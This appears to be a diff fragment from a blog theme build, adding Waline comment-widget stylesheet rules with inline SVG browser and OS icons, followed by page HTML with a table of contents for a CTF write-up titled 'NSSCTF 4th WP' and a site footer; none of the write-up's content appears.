+.wl-sort
+    margin 0
+    list-style-type none
+
+.wl-sort li
+    display inline-block
+    color var(--waline-info-color)
+    font-size 0.75em
+    cursor pointer
+
+.wl-sort li.active
+    color var(--waline-theme-color)
+
+.wl-sort li+li
+    margin-inline-start 1em
+
+.wl-reaction
+    overflow auto hidden
+    margin-bottom 1.75em
+    text-align center
+
+.wl-reaction img
+    width 100%
+    height 100%
+    transition all 250ms ease-in-out
+
+.wl-reaction-title
+    margin 16px auto
+    font-weight bold
+    font-size 18px
+
+.wl-reaction-list
+    display flex
+    flex-direction row
+    gap 16px
+    justify-content center
+    margin 0
+    padding 8px
+    list-style-type none
+
+@media (max-width 580px)
+    .wl-reaction-list
+        gap 12px
+
+[data-waline] .wl-reaction-list
+    margin-inline-start 0
+
+.wl-reaction-item
+    display flex
+    flex-direction column
+    align-items center
+    cursor pointer
+
+.wl-reaction-item:hover img, .wl-reaction-item.active img
+    transform scale(1.15)
+
+.wl-reaction-img
+    position relative
+    width 42px
+    height 42px
+
+@media (max-width 580px)
+    .wl-reaction-img
+        width 32px
+        height 32px
+
+.wl-reaction-loading
+    position absolute
+    top -4px
+    inset-inline-end -5px
+    width 18px
+    height 18px
+    color var(--waline-theme-color)
+
+.wl-reaction-votes
+    position absolute
+    top -9px
+    inset-inline-end -9px
+    min-width 1em
+    padding 2px
+    border 1px solid var(--waline-theme-color)
+    border-radius 1em
+    background var(--waline-bgcolor)
+    color var(--waline-theme-color)
+    font-weight 700
+    font-size 0.75em
+    line-height 1
+
+.wl-reaction-item.active .wl-reaction-votes
+    background var(--waline-theme-color)
+    color var(--waline-bgcolor)
+
+.wl-reaction-text
+    font-size 0.875em
+
+.wl-reaction-item.active .wl-reaction-text
+    color var(--waline-theme-color)
+
+.wl-content pre, .wl-content pre[class*=language-]
+    overflow auto
+    margin 0.75rem 0
+    padding 1rem 1.25rem
+    border-radius 6px
+    background var(--waline-code-bgcolor)
+    line-height 1.4
+
+.wl-content pre code, .wl-content pre[class*=language-] code
+    padding 0
+    border-radius 0
+    background rgba(0, 0, 0, 0) !important
+    color #bbb
+    direction ltr
+
+.wl-content code[class*=language-], .wl-content pre[class*=language-]
+    background none
+    color #ccc
+    font-size 1em
+    font-family Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace
+    text-align left
+    white-space pre
+    word-spacing normal
+    word-wrap normal
+    word-break normal
+    tab-size 4
+    hyphens none
+
+.wl-content pre[class*=language-]
+    overflow auto
+
+.wl-content :not(pre)>code[class*=language-], .wl-content pre[class*=language-]
+    background #2d2d2d
+
+.wl-content :not(pre)>code[class*=language-]
+    padding 0.1em
+    border-radius 0.3em
+    white-space normal
+
+.wl-content .token.comment, .wl-content .token.block-comment, .wl-content .token.prolog, .wl-content .token.doctype, .wl-content .token.cdata
+    color #999
+
+.wl-content .token.punctuation
+    color #ccc
+
+.wl-content .token.tag, .wl-content .token.attr-name, .wl-content .token.namespace, .wl-content .token.deleted
+    color #e2777a
+
+.wl-content .token.function-name
+    color #6196cc
+
+.wl-content .token.boolean, .wl-content .token.number, .wl-content .token.function
+    color #f08d49
+
+.wl-content .token.property, .wl-content .token.class-name, .wl-content .token.constant, .wl-content .token.symbol
+    color #f8c555
+
+.wl-content .token.selector, .wl-content .token.important, .wl-content .token.atrule, .wl-content .token.keyword, .wl-content .token.builtin
+    color #cc99cd
+
+.wl-content .token.string, .wl-content .token.char, .wl-content .token.attr-value, .wl-content .token.regex, .wl-content .token.variable
+    color #7ec699
+
+.wl-content .token.operator, .wl-content .token.entity, .wl-content .token.url
+    color #67cdcc
+
+.wl-content .token.important, .wl-content .token.bold
+    font-weight bold
+
+.wl-content .token.italic
+    font-style italic
+
+.wl-content .token.entity
+    cursor help
+
+.wl-content .token.inserted
+    color green
+
+.wl-recent-item p
+    display inline
+
+.wl-user-list
+    padding 0
+    list-style none
+
+.wl-user-list a, .wl-user-list a:hover, .wl-user-list a:visited
+    color var(--waline-color)
+    text-decoration none
+
+.wl-user-list .wl-user-avatar
+    position relative
+    display inline-block
+    overflow hidden
+    margin-inline-end 10px
+    border-radius 4px
+    line-height 0
+
+.wl-user-list .wl-user-avatar>img
+    width var(--waline-user-avatar-size, 48px)
+    height var(--waline-user-avatar-size, 48px)
+
+.wl-user-list .wl-user-badge
+    position absolute
+    bottom 0
+    inset-inline-end 0
+    min-width 0.7em
+    height 1.5em
+    padding 0 0.4em
+    border-radius 4px
+    background var(--waline-info-bgcolor)
+    color var(--waline-info-color)
+    font-weight bold
+    font-size 10px
+    line-height 1.5em
+    text-align center
+
+.wl-user-list .wl-user-item
+    margin 10px 0
+
+.wl-user-list .wl-user-item:nth-child(1) .wl-user-badge
+    background var(--waline-rank-gold-bgcolor, #fa3939)
+    color var(--waline-white)
+    font-weight bold
+
+.wl-user-list .wl-user-item:nth-child(2) .wl-user-badge
+    background var(--waline-rank-silver-bgcolor, #fb811c)
+    color var(--waline-white)
+    font-weight bold
+
+.wl-user-list .wl-user-item:nth-child(3) .wl-user-badge
+    background var(--waline-rank-copper-bgcolor, #feb207)
+    color var(--waline-white)
+
+.wl-user-list .wl-user-meta
+    display inline-block
+    vertical-align top
+
+.wl-user-list .wl-badge
+    display inline-block
+    vertical-align text-top
+    margin-inline-start 0.5em
+    padding 0 0.3em
+    border 1px solid var(--waline-badge-color)
+    border-radius 4px
+    color var(--waline-badge-color)
+    font-size var(--waline-badge-font-size)
+
+.wl-user-wall
+    padding 0
+    list-style none
+
+.wl-user-wall .wl-user-badge, .wl-user-wall .wl-user-meta
+    display none
+
+.wl-user-wall .wl-user-item
+    position relative
+    display inline-block
+    transition transform ease-in-out 0.2s
+
+.wl-user-wall .wl-user-item::before, .wl-user-wall .wl-user-item::after
+    position absolute
+    bottom 100%
+    left 50%
+    z-index 10
+    opacity 0
+    pointer-events none
+    transition all 0.18s ease-out 0.18s
+    transform translate(-50%, 4px)
+    transform-origin top
+
+.wl-user-wall .wl-user-item::before
+    content ''
+    width 0
+    height 0
+    border 5px solid rgba(0, 0, 0, 0)
+    border-top-color rgba(16, 16, 16, 0.95)
+
+.wl-user-wall .wl-user-item::after
+    content attr(aria-label)
+    margin-bottom 10px
+    padding 0.5em 1em
+    border-radius 2px
+    background rgba(16, 16, 16, 0.95)
+    color #fff
+    font-size 12px
+    white-space nowrap
+
+.wl-user-wall .wl-user-item:hover
+    transform scale(1.1)
+
+.wl-user-wall .wl-user-item:hover::before, .wl-user-wall .wl-user-item:hover::after
+    opacity 1
+    pointer-events none
+    transform translate(-50%, 0)
+
+.wl-user-wall .wl-user-item img
+    width var(--waline-user-avatar-size, 48px)
+    height var(--waline-user-avatar-size, 48px)
+
+/* # sourceMappingURL=waline.css.map */
+/* # sourceMappingURL=waline.css.map */
+/* Waline meta */
+.wl-meta > span::before
+    content ''
+    display inline-block
+    width 1em
+    height 1em
+    margin-right 2px
+    background-position center center
+    background-repeat no-repeat
+
+.wl-meta > .wl-addr::before
+    background-image url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 512 512' fill='%23999'%3E%3Cpath d='M444.52 3.52 28.74 195.42c-47.97 22.39-31.98 92.75 19.19 92.75h175.91v175.91c0 51.17 70.36 67.17 92.75 19.19l191.9-415.78c15.99-38.39-25.59-79.97-63.97-63.97z'/%3E%3C/svg%3E")
+
+.wl-meta > .wl-os::before, .wl-meta > .wl-browser::before
+    background-image url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 512 512' fill='%23999'%3E%3Cpath d='M464 32H48C21.5 32 0 53.5 0 80v352c0 26.5 21.5 48 48 48h416c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zm0 394c0 3.3-2.7 6-6 6H54c-3.3 0-6-2.7-6-6V192h416v234z'/%3E%3C/svg%3E")
+
+.wl-meta > .wl-os[data-value^='windows'i]::before
+    background-image url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 448 512' fill='%23999'%3E%3Cpath d='m0 93.7 183.6-25.3v177.4H0V93.7zm0 324.6 183.6 25.3V268.4H0v149.9zm203.8 28L448 480V268.4H203.8v177.9zm0-380.6v180.1H448V32L203.8 65.7z'/%3E%3C/svg%3E")
+
+.wl-meta > .wl-os[data-value^='mac'i]::before, .wl-meta > .wl-os[data-value^='ios'i]::before, .wl-meta > .wl-os[data-value^='iphone'i]::before, .wl-meta > .wl-os[data-value^='ipad'i]::before
+    background-image url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 384 512' fill='%23999'%3E%3Cpath d='M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z'/%3E%3C/svg%3E")
+
+.wl-meta > .wl-os[data-value^='linux'i]::before
+    background-image url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 448 512' fill='%23999'%3E%3Cpath d='M220.8 123.3c1 .5 1.8 1.7 3 1.7 1.1 0 2.8-.4 2.9-1.5.2-1.4-1.9-2.3-3.2-2.9-1.7-.7-3.9-1-5.5-.1-.4.2-.8.7-.6 1.1.3 1.3 2.3 1.1 3.4 1.7zm-21.9 1.7c1.2 0 2-1.2 3-1.7 1.1-.6 3.1-.4 3.5-1.6.2-.4-.2-.9-.6-1.1-1.6-.9-3.8-.6-5.5.1-1.3.6-3.4 1.5-3.2 2.9.1 1 1.8 1.5 2.8 1.4zM420 403.8c-3.6-4-5.3-11.6-7.2-19.7-1.8-8.1-3.9-16.8-10.5-22.4-1.3-1.1-2.6-2.1-4-2.9-1.3-.8-2.7-1.5-4.1-2 9.2-27.3 5.6-54.5-3.7-79.1-11.4-30.1-31.3-56.4-46.5-74.4-17.1-21.5-33.7-41.9-33.4-72C311.1 85.4 315.7.1 234.8 0 132.4-.2 158 103.4 156.9 135.2c-1.7 23.4-6.4 41.8-22.5 64.7-18.9 22.5-45.5 58.8-58.1 96.7-6 17.9-8.8 36.1-6.2 53.3-6.5 5.8-11.4 14.7-16.6 20.2-4.2 4.3-10.3 5.9-17 8.3s-14 6-18.5 14.5c-2.1 3.9-2.8 8.1-2.8 12.4 0 3.9.6 7.9 1.2 11.8 1.2 8.1 2.5 15.7.8 20.8-5.2 14.4-5.9 24.4-2.2 31.7 3.8 7.3 11.4 10.5 20.1 12.3 17.3 3.6 40.8 2.7 59.3 12.5 19.8 10.4 39.9 14.1 55.9 10.4 11.6-2.6 21.1-9.6 25.9-20.2 12.5-.1 26.3-5.4 48.3-6.6 14.9-1.2 33.6 5.3 55.1 4.1.6 2.3 1.4 4.6 2.5 6.7v.1c8.3 16.7 23.8 24.3 40.3 23 16.6-1.3 34.1-11 48.3-27.9 13.6-16.4 36-23.2 50.9-32.2 7.4-4.5 13.4-10.1 13.9-18.3.4-8.2-4.4-17.3-15.5-29.7zM223.7 87.3c9.8-22.2 34.2-21.8 44-.4 6.5 14.2 3.6 30.9-4.3 40.4-1.6-.8-5.9-2.6-12.6-4.9 1.1-1.2 3.1-2.7 3.9-4.6 4.8-11.8-.2-27-9.1-27.3-7.3-.5-13.9 10.8-11.8 23-4.1-2-9.4-3.5-13-4.4-1-6.9-.3-14.6 2.9-21.8zM183 75.8c10.1 0 20.8 14.2 19.1 33.5-3.5 1-7.1 2.5-10.2 4.6 1.2-8.9-3.3-20.1-9.6-19.6-8.4.7-9.8 21.2-1.8 28.1 1 .8 1.9-.2-5.9 5.5-15.6-14.6-10.5-52.1 8.4-52.1zm-13.6 60.7c6.2-4.6 13.6-10 14.1-10.5 4.7-4.4 13.5-14.2 27.9-14.2 7.1 0 15.6 2.3 25.9 8.9 6.3 4.1 11.3 4.4 22.6 9.3 8.4 3.5 13.7 9.7 10.5 18.2-2.6 7.1-11 14.4-22.7 18.1-11.1 3.6-19.8 16-38.2 14.9-3.9-.2-7-1-9.6-2.1-8-3.5-12.2-10.4-20-15-8.6-4.8-13.2-10.4-14.7-15.3-1.4-4.9 0-9 4.2-12.3zm3.3 334c-2.7 35.1-43.9 34.4-75.3 18-29.9-15.8-68.6-6.5-76.5-21.9-2.4-4.7-2.4-12.7 2.6-26.4v-.2c2.4-7.6.6-16-.6-23.9-1.2-7.8-1.8-15 .9-20 3.5-6.7 8.5-9.1 14.8-11.3 10.3-3.7 11.8-3.4 19.6-9.9 5.5-5.7 9.5-12.9 14.3-18 5.1-5.5 10-8.1 17.7-6.9 8.1 1.2 15.1 6.8 21.9 16l19.6 35.6c9.5 19.9 43.1 48.4 41 68.9zm-1.4-25.9c-4.1-6.6-9.6-13.6-14.4-19.6 7.1 0 14.2-2.2 16.7-8.9 2.3-6.2 0-14.9-7.4-24.9-13.5-18.2-38.3-32.5-38.3-32.5-13.5-8.4-21.1-18.7-24.6-29.9s-3-23.3-.3-35.2c5.2-22.9 18.6-45.2 27.2-59.2 2.3-1.7.8 3.2-8.7 20.8-8.5 16.1-24.4 53.3-2.6 82.4.6-20.7 5.5-41.8 13.8-61.5 12-27.4 37.3-74.9 39.3-112.7 1.1.8 4.6 3.2 6.2 4.1 4.6 2.7 8.1 6.7 12.6 10.3 12.4 10 28.5 9.2 42.4 1.2 6.2-3.5 11.2-7.5 15.9-9 9.9-3.1 17.8-8.6 22.3-15 7.7 30.4 25.7 74.3 37.2 95.7 6.1 11.4 18.3 35.5 23.6 64.6 3.3-.1 7 .4 10.9 1.4 13.8-35.7-11.7-74.2-23.3-84.9-4.7-4.6-4.9-6.6-2.6-6.5 12.6 11.2 29.2 33.7 35.2 59 2.8 11.6 3.3 23.7.4 35.7 16.4 6.8 35.9 17.9 30.7 34.8-2.2-.1-3.2 0-4.2 0 3.2-10.1-3.9-17.6-22.8-26.1-19.6-8.6-36-8.6-38.3 12.5-12.1 4.2-18.3 14.7-21.4 27.3-2.8 11.2-3.6 24.7-4.4 39.9-.5 7.7-3.6 18-6.8 29-32.1 22.9-76.7 32.9-114.3 7.2zm257.4-11.5c-.9 16.8-41.2 19.9-63.2 46.5-13.2 15.7-29.4 24.4-43.6 25.5s-26.5-4.8-33.7-19.3c-4.7-11.1-2.4-23.1 1.1-36.3 3.7-14.2 9.2-28.8 9.9-40.6.8-15.2 1.7-28.5 4.2-38.7 2.6-10.3 6.6-17.2 13.7-21.1.3-.2.7-.3 1-.5.8 13.2 7.3 26.6 18.8 29.5 12.6 3.3 30.7-7.5 38.4-16.3 9-.3 15.7-.9 22.6 5.1 9.9 8.5 7.1 30.3 17.1 41.6 10.6 11.6 14 19.5 13.7 24.6zM173.3 148.7c2 1.9 4.7 4.5 8 7.1 6.6 5.2 15.8 10.6 27.3 10.6 11.6 0 22.5-5.9 31.8-10.8 4.9-2.6 10.9-7 14.8-10.4s5.9-6.3 3.1-6.6-2.6 2.6-6 5.1c-4.4 3.2-9.7 7.4-13.9 9.8-7.4 4.2-19.5 10.2-29.9 10.2s-18.7-4.8-24.9-9.7c-3.1-2.5-5.7-5-7.7-6.9-1.5-1.4-1.9-4.6-4.3-4.9-1.4-.1-1.8 3.7 1.7 6.5z'/%3E%3C/svg%3E")
+
+.wl-meta > .wl-os[data-value^='ubuntu'i]::before
+    background-image url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 496 512' fill='%23999'%3E%3Cpath d='M248 8C111 8 0 119 0 256s111 248 248 248 248-111 248-248S385 8 248 8zm52.7 93c8.8-15.2 28.3-20.5 43.5-11.7 15.3 8.8 20.5 28.3 11.7 43.6-8.8 15.2-28.3 20.5-43.5 11.7-15.3-8.9-20.5-28.4-11.7-43.6zM87.4 287.9c-17.6 0-31.9-14.3-31.9-31.9 0-17.6 14.3-31.9 31.9-31.9 17.6 0 31.9 14.3 31.9 31.9 0 17.6-14.3 31.9-31.9 31.9zm28.1 3.1c22.3-17.9 22.4-51.9 0-69.9 8.6-32.8 29.1-60.7 56.5-79.1l23.7 39.6c-51.5 36.3-51.5 112.5 0 148.8L172 370c-27.4-18.3-47.8-46.3-56.5-79zm228.7 131.7c-15.3 8.8-34.7 3.6-43.5-11.7-8.8-15.3-3.6-34.8 11.7-43.6 15.2-8.8 34.7-3.6 43.5 11.7 8.8 15.3 3.6 34.8-11.7 43.6zm.3-69.5c-26.7-10.3-56.1 6.6-60.5 35-5.2 1.4-48.9 14.3-96.7-9.4l22.5-40.3c57 26.5 123.4-11.7 128.9-74.4l46.1.7c-2.3 34.5-17.3 65.5-40.3 88.4zm-5.9-105.3c-5.4-62-71.3-101.2-128.9-74.4l-22.5-40.3c47.9-23.7 91.5-10.8 96.7-9.4 4.4 28.3 33.8 45.3 60.5 35 23.1 22.9 38 53.9 40.2 88.5l-46 .6z'/%3E%3C/svg%3E")
+
+.wl-meta > .wl-os[data-value^='android'i]::before
+    background-image url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 576 512' fill='%23999'%3E%3Cpath d='M420.55 301.93a24 24 0 1 1 24-24 24 24 0 0 1-24 24m-265.1 0a24 24 0 1 1 24-24 24 24 0 0 1-24 24m273.7-144.48 47.94-83a10 10 0 1 0-17.27-10l-48.54 84.07a301.25 301.25 0 0 0-246.56 0l-48.54-84.07a10 10 0 1 0-17.27 10l47.94 83C64.53 202.22 8.24 285.55 0 384h576c-8.24-98.45-64.54-181.78-146.85-226.55'/%3E%3C/svg%3E")
+
+.wl-meta > .wl-browser[data-value^='chrome'i]::before
+    background-image url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 496 512' fill='%23999'%3E%3Cpath d='M131.5 217.5 55.1 100.1c47.6-59.2 119-91.8 192-92.1 42.3-.3 85.5 10.5 124.8 33.2 43.4 25.2 76.4 61.4 97.4 103L264 133.4c-58.1-3.4-113.4 29.3-132.5 84.1zm32.9 38.5c0 46.2 37.4 83.6 83.6 83.6s83.6-37.4 83.6-83.6-37.4-83.6-83.6-83.6-83.6 37.3-83.6 83.6zm314.9-89.2L339.6 174c37.9 44.3 38.5 108.2 6.6 157.2L234.1 503.6c46.5 2.5 94.4-7.7 137.8-32.9 107.4-62 150.9-192 107.4-303.9zM133.7 303.6 40.4 120.1C14.9 159.1 0 205.9 0 256c0 124 90.8 226.7 209.5 244.9l63.7-124.8c-57.6 10.8-113.2-20.8-139.5-72.5z'/%3E%3C/svg%3E")
+
+.wl-meta > .wl-browser[data-value^='edge'i]::before
+    background-image url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 512 512' fill='%23999'%3E%3Cpath d='M481.92 134.48C440.87 54.18 352.26 8 255.91 8 137.05 8 37.51 91.68 13.47 203.66c26-46.49 86.22-79.14 149.46-79.14 79.27 0 121.09 48.93 122.25 50.18 22 23.8 33 50.39 33 83.1 0 10.4-5.31 25.82-15.11 38.57-1.57 2-6.39 4.84-6.39 11 0 5.06 3.29 9.92 9.14 14 27.86 19.37 80.37 16.81 80.51 16.81A115.39 115.39 0 0 0 444.94 322a118.92 118.92 0 0 0 58.95-102.44c.5-43.43-15.5-72.3-21.97-85.08ZM212.77 475.67a154.88 154.88 0 0 1-46.64-45c-32.94-47.42-34.24-95.6-20.1-136A155.5 155.5 0 0 1 203 215.75c59-45.2 94.84-5.65 99.06-1a80 80 0 0 0-4.89-10.14c-9.24-15.93-24-36.41-56.56-53.51-33.72-17.69-70.59-18.59-77.64-18.59-38.71 0-77.9 13-107.53 35.69C35.68 183.3 12.77 208.72 8.6 243c-1.08 12.31-2.75 62.8 23 118.27a248 248 0 0 0 248.3 141.61c-38.12-6.62-65.85-26.64-67.13-27.21Zm250.72-98.33a7.76 7.76 0 0 0-7.92-.23 181.66 181.66 0 0 1-20.41 9.12 197.54 197.54 0 0 1-69.55 12.52c-91.67 0-171.52-63.06-171.52-144a61.12 61.12 0 0 1 6.52-26.75 168.72 168.72 0 0 0-38.76 50c-14.92 29.37-33 88.13 13.33 151.66 6.51 8.91 23 30 56 47.67 23.57 12.65 49 19.61 71.7 19.61 35.14 0 115.43-33.44 163-108.87a7.75 7.75 0 0 0-2.39-10.73Z'/%3E%3C/svg%3E")
+
+.wl-meta > .wl-browser[data-value^='firefox'i]::before
+    background-image url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 512 512' fill='%23999'%3E%3Cpath d='M189.37 152.86Zm-58.74-29.37c.16.01.08.01 0 0Zm351.42 45.35c-10.61-25.5-32.08-53-48.94-61.73 13.72 26.89 21.67 53.88 24.7 74 0 0 0 .14.05.41-27.58-68.75-74.35-96.47-112.55-156.83-1.93-3.05-3.86-6.11-5.74-9.33-1-1.65-1.86-3.34-2.69-5.05a44.88 44.88 0 0 1-3.64-9.62.63.63 0 0 0-.55-.66.9.9 0 0 0-.46 0l-.12.07-.18.1.1-.14c-54.23 31.77-76.72 87.38-82.5 122.78a130 130 0 0 0-48.33 12.33 6.25 6.25 0 0 0-3.09 7.75 6.13 6.13 0 0 0 7.79 3.79l.52-.21a117.84 117.84 0 0 1 42.11-11l1.42-.1c2-.12 4-.2 6-.22A122.61 122.61 0 0 1 291 140c.67.2 1.32.42 2 .63 1.89.57 3.76 1.2 5.62 1.87 1.36.5 2.71 1 4.05 1.58 1.09.44 2.18.88 3.25 1.35q2.52 1.13 5 2.35c.75.37 1.5.74 2.25 1.13q2.4 1.26 4.74 2.63 1.51.87 3 1.8a124.89 124.89 0 0 1 42.66 44.13c-13-9.15-36.35-18.19-58.82-14.28 87.74 43.86 64.18 194.9-57.39 189.2a108.43 108.43 0 0 1-31.74-6.12 139.5 139.5 0 0 1-7.16-2.93c-1.38-.63-2.76-1.27-4.12-2-29.84-15.34-54.44-44.42-57.51-79.75 0 0 11.25-41.95 80.62-41.95 7.5 0 28.93-20.92 29.33-27-.09-2-42.54-18.87-59.09-35.18-8.85-8.71-13.05-12.91-16.77-16.06a69.58 69.58 0 0 0-6.31-4.77 113.05 113.05 0 0 1-.69-59.63c-25.06 11.41-44.55 29.45-58.71 45.37h-.12c-9.67-12.25-9-52.65-8.43-61.08-.12-.53-7.22 3.68-8.15 4.31a178.54 178.54 0 0 0-23.84 20.43 214 214 0 0 0-22.77 27.33 205.84 205.84 0 0 0-32.73 73.9c-.06.27-2.33 10.21-4 22.48q-.42 2.87-.78 5.74c-.57 3.69-1 7.71-1.44 14 0 .24 0 .48-.05.72-.18 2.71-.34 5.41-.49 8.12v1.24c0 134.7 109.21 243.89 243.92 243.89 120.64 0 220.82-87.58 240.43-202.62.41-3.12.74-6.26 1.11-9.41 4.85-41.83-.54-85.79-15.82-122.55Z'/%3E%3C/svg%3E")
+
+.wl-meta > .wl-browser[data-value^='safari'i]::before
+    background-image url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 512 512' fill='%23999'%3E%3Cpath d='m274.69 274.69-37.38-37.38L166 346ZM256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8Zm155.85 174.79 14.78-6.13a8 8 0 0 1 10.45 4.34 8 8 0 0 1-4.33 10.46L418 197.57a8 8 0 0 1-10.45-4.33 8 8 0 0 1 4.3-10.45ZM314.43 94l6.12-14.78a8 8 0 0 1 10.45-4.3 8 8 0 0 1 4.33 10.45l-6.13 14.78a8 8 0 0 1-10.45 4.33A8 8 0 0 1 314.43 94ZM256 60a8 8 0 0 1 8 8v16a8 8 0 0 1-8 8 8 8 0 0 1-8-8V68a8 8 0 0 1 8-8Zm-75 14.92a8 8 0 0 1 10.46 4.33L197.57 94a8 8 0 1 1-14.78 6.12l-6.13-14.78A8 8 0 0 1 181 74.92Zm-63.58 42.49a8 8 0 0 1 11.31 0L140 128.72a8 8 0 0 1 0 11.28 8 8 0 0 1-11.31 0l-11.31-11.31a8 8 0 0 1 .03-11.28ZM60 256a8 8 0 0 1 8-8h16a8 8 0 0 1 8 8 8 8 0 0 1-8 8H68a8 8 0 0 1-8-8Zm40.15 73.21-14.78 6.13A8 8 0 0 1 74.92 331a8 8 0 0 1 4.33-10.46L94 314.43a8 8 0 0 1 10.45 4.33 8 8 0 0 1-4.3 10.45Zm4.33-136A8 8 0 0 1 94 197.57l-14.78-6.12a8 8 0 0 1-4.3-10.45 8 8 0 0 1 10.45-4.33l14.78 6.13a8 8 0 0 1 4.33 10.44ZM197.57 418l-6.12 14.78a8 8 0 0 1-14.79-6.12l6.13-14.78a8 8 0 1 1 14.78 6.12ZM264 444a8 8 0 0 1-8 8 8 8 0 0 1-8-8v-16a8 8 0 0 1 8-8 8 8 0 0 1 8 8Zm67-6.92a8 8 0 0 1-10.46-4.33L314.43 418a8 8 0 0 1 4.33-10.45 8 8 0 0 1 10.45 4.33l6.13 14.78a8 8 0 0 1-4.34 10.42Zm63.58-42.49a8 8 0 0 1-11.31 0L372 383.28a8 8 0 0 1 0-11.28 8 8 0 0 1 11.31 0l11.31 11.31a8 8 0 0 1-.03 11.28ZM286.25 286.25 110.34 401.66l115.41-175.91 175.91-115.41ZM437.08 331a8 8 0 0 1-10.45 4.33l-14.78-6.13a8 8 0 0 1-4.33-10.45 8 8 0 0 1 10.48-4.32l14.78 6.12a8 8 0 0 1 4.3 10.45Zm6.92-67h-16a8 8 0 0 1-8-8 8 8 0 0 1 8-8h16a8 8 0 0 1 8 8 8 8 0 0 1-8 8Z'/%3E%3C/svg%3E")
+
+.wl-meta > .wl-browser[data-value^='ie'i]::before, .wl-meta > .wl-browser[data-value^='explorer'i]::before
+    background-image url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 512 512' fill='%23999'%3E%3Cpath d='M483.049 159.706c10.855-24.575 21.424-60.438 21.424-87.871 0-72.722-79.641-98.371-209.673-38.577-107.632-7.181-211.221 73.67-237.098 186.457 30.852-34.862 78.271-82.298 121.977-101.158C125.404 166.85 79.128 228.002 43.992 291.725 23.246 329.651 0 390.94 0 436.747c0 98.575 92.854 86.5 180.251 42.006 31.423 15.43 66.559 15.573 101.695 15.573 97.124 0 184.249-54.294 216.814-146.022H377.927c-52.509 88.593-196.819 52.996-196.819-47.436H509.9c6.407-43.581-1.655-95.715-26.851-141.162zM64.559 346.877c17.711 51.15 53.703 95.871 100.266 123.304-88.741 48.94-173.267 29.096-100.266-123.304zm115.977-108.873c2-55.151 50.276-94.871 103.98-94.871 53.418 0 101.981 39.72 103.981 94.871H180.536zm184.536-187.6c21.425-10.287 48.563-22.003 72.558-22.003 31.422 0 54.274 21.717 54.274 53.722 0 20.003-7.427 49.007-14.569 67.867-26.28-42.292-65.986-81.584-112.263-99.586z'/%3E%3C/svg%3E")
+
+/* # sourceMappingURL=waline-meta.css.map */
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">NSSCTF 4th WP</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-signin"><span class="nav-text">ez_signin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#filesystem"><span class="nav-text">filesystem</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp%E2%80%94%E2%80%94%E7%9B%B4%E6%8E%A5%E6%89%93%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">exp——直接打反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">phar反序列化</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EzCRC"><span class="nav-text">EzCRC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-upload"><span class="nav-text">ez_upload</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">xiaolaisec</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
